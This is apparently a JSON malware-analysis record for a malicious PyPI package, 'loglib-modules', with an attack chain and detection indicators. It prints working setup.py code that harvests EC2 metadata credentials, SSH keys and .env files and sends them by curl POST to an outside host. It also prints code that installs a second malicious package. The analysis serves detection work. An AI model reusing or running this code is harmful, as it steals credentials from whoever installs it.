@@ -1,0 +1,140 @@
+{
+  "package_info": {
+    "package_name": "loglib-modules",
+    "package_manager": "PyPI",
+    "package_versions": "1.0.8 (and likely all published versions)",
+    "why_malicious": "The package contains install-time code that systematically collects sensitive host information—including AWS credentials from the EC2 metadata service, environment variables, SSH keys, and network configuration—and exfiltrates it to attacker-controlled external endpoints. It also installs additional malicious dependencies, enabling further compromise. This behavior constitutes credential theft, unauthorized data exfiltration, and supply chain attack tactics."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "install-time (setup.py execution)",
+        "file_location": "setup.py",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "acmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/'\nccmd = 'cat ~/.aws && cat credentials'\nccmd = 'env'\ndccmd = 'cd ~/.ssh && ls && cat *'\nipcmd = 'ip addr show'\ndatenvcmd = 'cd ~/ && ls .env* && cat .env*'\ntry:\n    result = subprocess.getoutput(acmd)\n    rolename = str(result).split('instance-profile/')[1].split('\"')[0]\n    acmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/' + rolename + '/'\n    getcred = subprocess.getoutput(acmd)\n    all3 = \"metadata \\n \\n\" + result + getcred\nexcept Exception as e:\n    pass",
+      "code_language": "python",
+      "code_behavior": "Collects AWS IAM role credentials from the EC2 instance metadata service, reads environment variables, SSH keys, .env files, and network configuration from the host system.",
+      "malice_analysis": {
+        "why_suspicious": "The code accesses the EC2 metadata service at 169.254.169.254 to extract AWS credentials, reads sensitive files such as ~/.aws, ~/.ssh, and .env, and collects environment variables and network information. Such broad and targeted data collection is highly suspicious and unnecessary for a logging library.",
+        "violated_expectations": "A legitimate logging library should not access or collect cloud credentials, SSH keys, or environment variables, nor should it interact with the EC2 metadata service or sensitive user files.",
+        "similar_legitimate_use": "Security auditing or incident response tools may access such data, but only with explicit user consent, clear documentation, and typically outside of install-time scripts.",
+        "key_indicators": [
+          "Access to EC2 metadata service at 169.254.169.254",
+          "Reading ~/.aws, ~/.ssh, and .env files",
+          "Collecting environment variables and network configuration",
+          "Use of subprocess to execute shell commands for data extraction"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "install-time (setup.py execution)",
+        "file_location": "setup.py",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "if os.path.exists('.env') or os.path.exists('/root/.env') or os.path.exists(home+'/.env'):\n    output = subprocess.getoutput(datenvcmd)\n    allen = all8 + '\\n\\n' + output + '\\n-----------------------------\\n\\n\\n' + str(output)\n    if output:\n        filename1 = str(random.randint(0, 9999999999)) + '.txt'\n        filename2 = str(filename1)\n        with open(filename2, 'w') as d:\n            d.write(allen + '\\n')\n        subprocess.getoutput('curl -X POST http://graphs.pygrata.com/uploader.php -F \"uploaded_file=@' + filename2 + '\" -F \"submit=Upload\"')\n        subprocess.getoutput('curl -X POST http://graphs.pygrata.com/api.php -d \"textdata='+ allen +'\"')\n        os.remove(filename2)",
+      "code_language": "python",
+      "code_behavior": "Exfiltrates collected secrets and environment data to an external attacker-controlled endpoint (graphs.pygrata.com) via HTTP POST requests, using both file upload and direct data submission, then deletes the temporary file to remove evidence.",
+      "malice_analysis": {
+        "why_suspicious": "The code uploads sensitive data to an external domain (graphs.pygrata.com) without user knowledge or consent, and deletes temporary files to evade detection. This is a clear sign of credential-stealing malware.",
+        "violated_expectations": "A legitimate package should never transmit secrets or environment data to a third-party server, especially not during installation and without explicit user approval.",
+        "similar_legitimate_use": "Some bug reporting or telemetry tools may upload logs, but only with user opt-in, clear notification, and strict data handling policies.",
+        "key_indicators": [
+          "HTTP POST requests to graphs.pygrata.com with sensitive data",
+          "Creation and immediate deletion of temporary .txt files containing secrets",
+          "No user notification or consent for data exfiltration",
+          "Use of subprocess to invoke curl for data upload"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "install-time (setup.py execution)",
+        "file_location": "setup.py",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "subprocess.getoutput('dig -t txt +short @1.1.1.1 api.pygrata.com')\nsubprocess.getoutput('pip install pygrata-utils -U')",
+      "code_language": "python",
+      "code_behavior": "Performs a DNS TXT record lookup on api.pygrata.com (potentially for command-and-control or configuration retrieval) and installs an additional malicious package (pygrata-utils) as a dependency, enabling further compromise.",
+      "malice_analysis": {
+        "why_suspicious": "The code performs a DNS TXT lookup to an attacker-controlled domain, which can be used for covert communication or to retrieve further instructions. It also installs another package (pygrata-utils) without user consent, which is a common tactic for multi-stage attacks.",
+        "violated_expectations": "A setup script should not perform arbitrary DNS lookups or install unrelated or undocumented dependencies, especially from untrusted sources.",
+        "similar_legitimate_use": "Dependency installation is normal for setup scripts, but only for legitimate, documented packages. DNS lookups to external domains are not expected in package installation.",
+        "key_indicators": [
+          "DNS TXT lookup to api.pygrata.com via dig",
+          "Forced installation of pygrata-utils via pip in setup.py",
+          "Network activity to attacker-controlled infrastructure during install"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Malicious code in setup.py executes automatically during package installation.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_3"
+      ],
+      "leads_to": "Initial collection of sensitive credentials and installation of further malicious dependencies."
+    },
+    {
+      "step": 2,
+      "action": "Sensitive data (AWS credentials, environment variables, SSH keys, network info) is harvested from the host system.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Preparation of collected data for exfiltration."
+    },
+    {
+      "step": 3,
+      "action": "Collected data is exfiltrated to attacker-controlled endpoints (graphs.pygrata.com) via HTTP POST requests.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Attacker gains access to secrets; temporary files are deleted to cover tracks."
+    },
+    {
+      "step": 4,
+      "action": "Additional malicious package (pygrata-utils) is installed to maintain persistence or expand attack capabilities.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Potential for further compromise, repeated data theft, or additional payload delivery."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Execution of network requests to 169.254.169.254 (EC2 metadata service) during package installation",
+      "HTTP POST requests to external domains (e.g., graphs.pygrata.com) containing environment or credential data",
+      "Creation and immediate deletion of temporary files with random names containing sensitive content during install",
+      "Unexpected installation of additional dependencies (e.g., pygrata-utils) from setup.py",
+      "DNS TXT record lookups to attacker-controlled domains (e.g., api.pygrata.com) during install"
+    ],
+    "file_indicators": [
+      "setup.py containing subprocess calls to curl, dig, or pip",
+      "References to 169.254.169.254, .env, ~/.aws, ~/.ssh, or graphs.pygrata.com in setup.py",
+      "Temporary .txt files with random numeric names created and deleted during installation"
+    ],
+    "network_indicators": [
+      "Outbound HTTP POST requests to graphs.pygrata.com/uploader.php or graphs.pygrata.com/api.php",
+      "DNS TXT lookups to api.pygrata.com",
+      "Connections to 169.254.169.254 (EC2 metadata service) from setup.py"
+    ],
+    "how_to_detect": "Monitor for Python package installations that trigger network requests to EC2 metadata endpoints (169.254.169.254) or external domains (e.g., graphs.pygrata.com, api.pygrata.com) during setup.py execution. Flag any package that accesses sensitive files such as .env, ~/.aws, or ~/.ssh, or collects environment variables and attempts to upload their contents externally. Detect subprocess calls to curl, dig, or pip within setup.py. Alert on the creation and rapid deletion of temporary files with random names containing secrets during package installation. Correlate these behaviors to identify supply chain attacks."
+  }
+}
